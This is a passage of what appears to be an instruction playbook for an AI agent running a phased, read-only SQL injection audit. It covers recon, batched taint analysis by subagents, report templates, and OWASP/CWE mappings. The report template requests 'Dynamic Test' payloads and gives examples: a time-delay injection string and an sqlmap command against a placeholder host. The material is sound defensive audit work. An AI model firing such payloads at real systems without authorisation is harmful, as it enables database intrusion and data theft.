>    - MySQL `PREPARE stmt FROM CONCAT('...', var, '...')`
>
> 8. **Batch / stacked query enablers**:
>    - Raw strings passed to `execute()` with drivers that allow `multiStatements` / `allowMultiQueries`
>
> **What to skip** (these are safe construction patterns — do not flag):
> - Static query strings with no dynamic parts: `cursor.execute("SELECT * FROM users WHERE id = %s", (val,))`
> - ORM safe query builder methods: `.filter()`, `.where(col: val)`, `.findOne()`, `.findUnique()`, `prisma.$queryRaw` with tagged template literals
> - Properly parameterized raw queries where the string itself is static and values are passed as a separate argument list: `execute("SELECT * WHERE id = %s", (val,))`, `query("SELECT * WHERE id = ?", [val])`
> - NoSQL queries built as language-native structures with validated scalar values
>
> **Output format** — write to `{{ REPORTS_ROOT }}/02_recon.md`:
>
> ```markdown
> # SQLi Recon: [Project Name]
>
> ## Summary
> Found [N] locations where SQL queries are constructed in a vulnerable way.
>
> ## Vulnerable Construction Sites
>
> ### 1. [Descriptive name — e.g., "String concat in get_user query"]
> - **File**: `path/to/file.ext` (lines X-Y)
> - **Function / endpoint**: [function name or route]
> - **Query execution method**: [cursor.execute / db.query / raw / etc.]
> - **Construction pattern**: [string concat / f-string / template literal / % format / .format() / fmt.Sprintf / ORM raw]
> - **Interpolated variable(s)**: `var_name` — [brief note on what it appears to represent, e.g., "looks like a sort column" or "unknown origin"]
> - **Code snippet**:
>   ```
>   [the vulnerable query construction + execution call]
>   ```
>
> [Repeat for each site]
> ```

### After Phase 1: Check for Candidates Before Proceeding
[ref: #sqli-phase1-gate]

After Phase 1 completes, read `{{ REPORTS_ROOT }}/02_recon.md`. If the recon found **zero vulnerable construction sites** (the summary reports "Found 0" or the "Vulnerable Construction Sites" section is empty or absent), **skip Phase 2 entirely**. Instead, write the following content to `{{ REPORTS_ROOT }}/02_sqli.md` and stop:

```markdown
# SQLi Analysis Results

No vulnerabilities found.
```

Only proceed to Phase 2 if Phase 1 found at least one vulnerable construction site.

### Phase 2: Verify — Taint Analysis (Batched)
[ref: #sqli-phase2-verify]

After Phase 1 completes, read `{{ REPORTS_ROOT }}/02_recon.md` and split the construction sites into **batches of up to 3 sites each**. Launch **one subagent per batch in parallel**. Each subagent traces user input only for its assigned sites and writes results to its own batch file.

**Batching procedure** (you, the orchestrator, do this — not a subagent):

1. Read `{{ REPORTS_ROOT }}/02_recon.md` and count the numbered site sections under "Vulnerable Construction Sites" (### 1., ### 2., etc.).
2. Divide them into batches of up to 3. For example, 8 sites → 3 batches (1-3, 4-6, 7-8).
3. For each batch, extract the full text of those site sections from the recon file.
4. Launch all batch subagents **in parallel**, passing each one only its assigned sites.
5. Each subagent writes to `{{ REPORTS_ROOT }}/02_batch_N.md` where N is the 1-based batch number.
6. Identify the project's primary language/framework from `{{ REPORTS_ROOT }}/01_architecture.md` and select **only the matching examples** from the "Vulnerable vs. Secure Examples" section above. For example, if the project uses Node.js with `pg`, include the "Node.js — pg (PostgreSQL)" and related Node examples. Include these selected examples in each subagent's instructions where indicated by `[TECH-STACK EXAMPLES]` below.

Give each batch subagent the following instructions (substitute the batch-specific values):

> **Goal**: For each assigned vulnerable SQL construction site, determine whether a user-supplied value reaches the interpolated variable. Our goal is to find SQL injection vulnerabilities. Write results to `{{ REPORTS_ROOT }}/02_batch_[N].md`.
>
> **Your assigned construction sites** (from the recon phase):
>
> [Paste the full text of the assigned site sections here, preserving the original numbering]
>
> **Context**: You will be given the project's architecture summary. Use it to understand request entry points, middleware, and how data flows through the application.
>
> **SQLi reference — trace the interpolated variable(s) backwards to their origin**:
>
> 1. **Direct user input** — the variable is assigned directly from a request source with no transformation:
>    - HTTP query params: `request.GET.get(...)`, `req.query.x`, `params[:x]`, `$_GET['x']`, `c.Query("x")`
>    - Path parameters: `request.path_params['id']`, `req.params.id`, `params[:id]`
>    - Request body / form fields: `request.POST.get(...)`, `req.body.x`, `params[:x]`, `$_POST['x']`
>    - HTTP headers: `request.headers.get(...)`, `req.headers['x']`
>    - Cookies: `request.COOKIES.get(...)`, `req.cookies.x`
>    - GraphQL arguments: `args.x`, `env.getArgument("x")`
>
> 2. **Indirect user input** — the variable is derived from user input through transformations, function calls, or intermediate assignments. Trace the full chain:
>    - Variable assigned from a function return value → check that function's parameter origin
>    - Variable passed as a function argument → check the call site(s)
>    - Variable read from a class attribute or shared state set elsewhere → find the setter
>    - Variable conditionally assigned — check all branches
>
> 3. **Second-order input** — the variable is read from the database, but the stored value originally came from user input:
>    - Find where this value was written to the DB — was it stored from a user-supplied field?
>    - Was it sanitized or parameterized at write time?
>
> 4. **Third-party API input** — the variable comes from data pulled from an integrated API:
>    - Map to **API10:2023 Unsafe Consumption of APIs**.
>
> 5. **Server-side / hardcoded value** — the variable comes from config, an environment variable, a hardcoded constant, or server-side logic with no user influence — this site is NOT exploitable.
>
> **Mitigations** (check even if user input might reach the variable):
> - Allowlist validation before use (especially for dynamic identifiers — column/table names, `ORDER BY`)
> - Type casts that genuinely constrain the value in context (e.g., `int(val)` in purely numeric SQL fragments)
> - Custom escaping (`mysql_real_escape_string` — removed in PHP 7, historical only — `addslashes`, homegrown sanitizers) is **not** equivalent to parameterization — still classify as Likely Vulnerable if taint is present
>
> **Vulnerable vs. Secure examples for this project's tech stack**:
>
> [TECH-STACK EXAMPLES]
>
> **Classification**:
> - **Vulnerable**: User input demonstrably reaches the interpolated variable with no effective mitigation.
> - **Likely Vulnerable**: User input probably reaches the variable (indirect flow) or only weak mitigation (custom escaping) is present.
> - **Not Vulnerable**: The variable is server-side only, OR effective parameterization / allowlist validation is in place.
> - **Needs Manual Review**: Cannot determine the variable's origin with confidence (opaque helpers, complex flows, external libraries).
>
> **Required fields for every finding**:
> - **OWASP API 2023 root-cause risk**: choose API8:2023 Security Misconfiguration and/or API10:2023 Unsafe Consumption of APIs, and explain why.
> - **CWE**: map to the most specific CWE from the reference (e.g., CWE-89, CWE-943, CWE-20, CWE-116).
> - **Dynamic Test**: include at least one manual payload or sqlmap command appropriate to the database and injection context; include a time-delay payload when error-based confirmation is unavailable.
>
> **Output format** — write to `{{ REPORTS_ROOT }}/02_batch_[N].md`:
>
> ```markdown
> # SQLi Batch [N] Results
>
> ## Findings
>
> ### [VULNERABLE] Descriptive name
> - **File**: `path/to/file.ext` (lines X-Y)
> - **Endpoint / function**: [route or function name]
> - **OWASP API 2023 root-cause risk**: [API8:2023 Security Misconfiguration / API10:2023 Unsafe Consumption of APIs / both]
> - **CWE**: [CWE-89 / CWE-943 / CWE-20 / CWE-116 / ...]
> - **Issue**: [e.g., "HTTP query param `username` flows directly into f-string SELECT query"]
> - **Taint trace**: [Step-by-step from entry point to the construction site]
> - **Impact**: [What an attacker can do — extract records, bypass auth, delete data, etc.]
> - **Remediation**: [Parameterized query, ORM equivalent, or allowlist for identifiers]
> - **Dynamic Test**:
>   ```
>   [sqlmap command or manual curl payload. Show parameter, payload, expected response signal.
>    Include a time-delay payload such as ' OR SLEEP(5)-- when error-based confirmation is unavailable.
>    Example: sqlmap -u "https://app.example.com/search?q=test" -p q --dbs]
>   ```
>
> ### [LIKELY VULNERABLE] Descriptive name
> - **File**: `path/to/file.ext` (lines X-Y)
> - **Endpoint / function**: [route or function name]
> - **OWASP API 2023 root-cause risk**: [API8 / API10 / both]
> - **CWE**: [CWE-89 / CWE-943 / CWE-116]
> - **Issue**: [e.g., "Indirect flow or custom escaping only"]
> - **Taint trace**: [Best-effort trace; mark uncertain steps]
> - **Concern**: [Why it remains a risk]
> - **Remediation**: [Replace with parameterized query]
> - **Dynamic Test**:
>   ```
>   [payload to attempt bypass]
>   ```
>
> ### [NOT VULNERABLE] Descriptive name
> - **File**: `path/to/file.ext` (lines X-Y)
> - **Endpoint / function**: [route or function name]
> - **Reason**: [e.g., "Server-side constant" or "Allowlist gates sort column"]
>
> ### [NEEDS MANUAL REVIEW] Descriptive name
> - **File**: `path/to/file.ext` (lines X-Y)
> - **Endpoint / function**: [route or function name]
> - **Uncertainty**: [Why origin could not be determined]
> - **Suggestion**: [What to trace manually]
> ```

### Phase 3: Merge — Consolidate Batch Results
[ref: #sqli-phase3-merge]

After **all** Phase 2 batch subagents complete, read every `{{ REPORTS_ROOT }}/02_batch_*.md` file and merge them into a single `{{ REPORTS_ROOT }}/02_sqli.md`. You (the orchestrator) do this directly — no subagent needed.

**Merge procedure**:

1. Read all `{{ REPORTS_ROOT }}/02_batch_1.md`, `{{ REPORTS_ROOT }}/02_batch_2.md`, ... files.
2. Collect all findings from each batch file and combine them into one list, preserving the original classification and all detail fields.
3. Count totals across all batches for the executive summary (construction sites analyzed = total sites from recon that were batched, i.e., sum of sites across batches).
4. Write the merged report to `{{ REPORTS_ROOT }}/02_sqli.md` using this format:

```markdown
# SQLi Analysis Results: [Project Name]

## Executive Summary
- Construction sites analyzed: [total across all batches]
- Vulnerable: [N]
- Likely Vulnerable: [N]
- Not Vulnerable: [N]
- Needs Manual Review: [N]

## Findings

[All findings from all batches, grouped by classification:
 VULNERABLE first, then LIKELY VULNERABLE, then NEEDS MANUAL REVIEW, then NOT VULNERABLE.
 Preserve every field from the batch results exactly as written.]
```

5. After writing `{{ REPORTS_ROOT }}/02_sqli.md`, **delete all intermediate batch files** (`{{ REPORTS_ROOT }}/02_batch_*.md`).

***

## OWASP API Security Top 10 2023 mapping
[ref: #sqli-owasp-mapping]

The official OWASP API Security Top 10 2023 does **not** contain a standalone "Injection" category. SQL injection in APIs should be reported through its root-cause risk.

This scan supports the following OWASP API Security Top 10 2023 risks:

| Root cause | OWASP risk | When to cross-map |
| --- | --- | --- |
| Unsafe dynamic SQL built from user input | API8:2023 Security Misconfiguration | Default/unsafe ORM settings, missing input validation, verbose SQL errors, lack of parameterized-query adoption as an organizational hardening practice. |
| Unsanitized data from a third-party API inserted into SQL | API10:2023 Unsafe Consumption of APIs | Data pulled from an integration is trusted and used in raw SQL. |
| Missing parameterized query adoption as an organizational pattern | API8:2023 Security Misconfiguration | Repeated across codebase; hardening/configuration failure. |

**API8:2023 — Security Misconfiguration**
- *Description*: APIs and the systems supporting them typically contain complex configurations. Software and DevOps engineers can miss these configurations, or don't follow security best practices when it comes to configuration, opening the door for different types of attacks.
- *Relevance to SQLi*: Choosing ORM raw/unsafe methods, disabling prepared statements, enabling verbose SQL errors, or failing to validate dynamic identifiers are all configuration/hardening failures that allow injection.
- *Official prevention*: A repeatable hardening process, continuous configuration assessment, and restricting incoming content types/data formats.

**API10:2023 — Unsafe Consumption of APIs**
- *Description*: Developers tend to trust data received from third-party APIs more than user input, and so tend to adopt weaker security standards. In order to compromise APIs, attackers go after integrated third-party services instead of trying to compromise the target API directly.
- *Relevance to SQLi*: A third-party API may return attacker-controlled values (e.g., a malicious business name or repository name) that are later inserted into raw SQL by the target API.
- *Official prevention*: Always validate and properly sanitize data received from integrated APIs before using it.

Each finding in `{{ REPORTS_ROOT }}/02_sqli.md` must include an **OWASP API 2023 root-cause risk** field explaining which risk(s) the finding represents.

***

## CWE references
[ref: #sqli-cwe-references]

Map findings to the CWE taxonomy when the root cause is clear:

- **CWE-89**: Improper Neutralization of Special Elements in SQL Command ('SQL Injection') — use for classic concatenation/interpolation into SQL.
- **CWE-564**: SQL Injection: Hibernate — use when Hibernate/JPA native or HQL queries are built dynamically.
- **CWE-943**: Improper Neutralization of Special Elements in Data Query Logic — use for NoSQL injection, Elasticsearch/Lucene injection, DynamoDB expression injection, and other non-SQL query-language injections.
- **CWE-20**: Improper Input Validation — when input validation is missing entirely or when dynamic identifiers lack allowlist validation.
- **CWE-116**: Improper Encoding or Escaping of Output — when manual escaping is used instead of parameterization (custom sanitizer, `addslashes`, `mysql_real_escape_string`, etc.).
- **CWE-74**: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection') — use as a broader parent mapping when multiple downstream injection channels exist.
- **CWE-78**: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection') — do **not** use for SQLi; only map here if the SQLi vector also leads to command execution and that is the primary finding.

When a single finding involves multiple weaknesses (e.g., missing validation plus unsafe concatenation), list the most specific SQLi CWE first, followed by supporting CWEs.

***

## Important Reminders
[ref: #sqli-reminders]

- Read `{{ REPORTS_ROOT }}/01_architecture.md` and pass its content to all subagents as context.
- **This is a read-only audit.** Do not modify project source code, configuration files, test data, or any other project file. Subagents must only read and report.
- Phase 2 must run AFTER Phase 1 completes — it depends on the recon output.
- Phase 3 must run AFTER all Phase 2 batches complete — it depends on all batch outputs.
- Batch size is **3 construction sites per subagent**. If there are 1-3 sites total, use a single subagent. If there are 10, use 4 subagents (3+3+3+1).
- Launch all batch subagents **in parallel** — do not run them sequentially.
- Each batch subagent receives only its assigned sites' text from the recon file, not the entire recon file. This keeps each subagent's context small and focused.
- **Phase 1 is purely structural**: flag any dynamic variable embedded in a SQL query string, regardless of origin. Do not trace user input in Phase 1 — that is Phase 2's job.
- **Phase 2 is purely taint analysis**: for each assigned site, trace the interpolated variable back to its origin. If it comes from a user-controlled source, the site is a real vulnerability.
- Focus on **raw SQL and ORM raw/unsafe methods**. Standard ORM query builder calls (`.filter()`, `.where(col: val)`, `.find()`) are safe by default — do not flag them.
- When in doubt, classify as "Needs Manual Review" rather than "Not Vulnerable". False negatives are worse than false positives in security assessment.
- Taint can flow indirectly: a request parameter may be extracted in a middleware, stored in a shared object, passed through several helper functions, and finally reach the query construction. Trace the full chain.
- Custom escaping (including `mysql_real_escape_string`, `addslashes`, or homegrown sanitizers) is **not** equivalent to parameterization — flag as Likely Vulnerable even if escaping is present.
- For dynamic identifiers (column/table names), parameterization cannot help — the only safe fix is allowlist validation. Flag any dynamic identifier without an allowlist, regardless of whether it appears user-controlled.
- Second-order injection is easy to miss: a value stored in the DB from user input may later be read and used unsafely in a raw query elsewhere in the codebase. In Phase 2, treat DB-read values as potentially tainted and trace back to where they were written.
- Third-party API data is also tainted: values received from external integrations can carry SQLi payloads and should be treated like user input when they reach SQL.
- Preserve intermediate files (`{{ REPORTS_ROOT }}/02_recon.md` and all `{{ REPORTS_ROOT }}/02_batch_*.md`) until the final consolidated report (`{{ REPORTS_ROOT }}/report.md`) has been written. Delete them only after `references/99-report.md` has finished and the orchestrator confirms no further reads are needed.
- Clean up intermediate files: delete `{{ REPORTS_ROOT }}/02_recon.md` and all `{{ REPORTS_ROOT }}/02_batch_*.md` files after the final `{{ REPORTS_ROOT }}/report.md` is written.

***

## References
[ref: #sqli-references]

- OWASP API Security Top 10 2023 — [API8:2023 Security Misconfiguration](0xa8-security-misconfiguration.md)
- OWASP API Security Top 10 2023 — [API10:2023 Unsafe Consumption of APIs](0xaa-unsafe-consumption-of-apis.md)
- OWASP Injection Prevention Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html
- OWASP SQL Injection Prevention Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
- CWE-89 — https://cwe.mitre.org/data/definitions/89.html
- CWE-564 — https://cwe.mitre.org/data/definitions/564.html
- CWE-943 — https://cwe.mitre.org/data/definitions/943.html
- CWE-20 — https://cwe.mitre.org/data/definitions/20.html
- CWE-116 — https://cwe.mitre.org/data/definitions/116.html
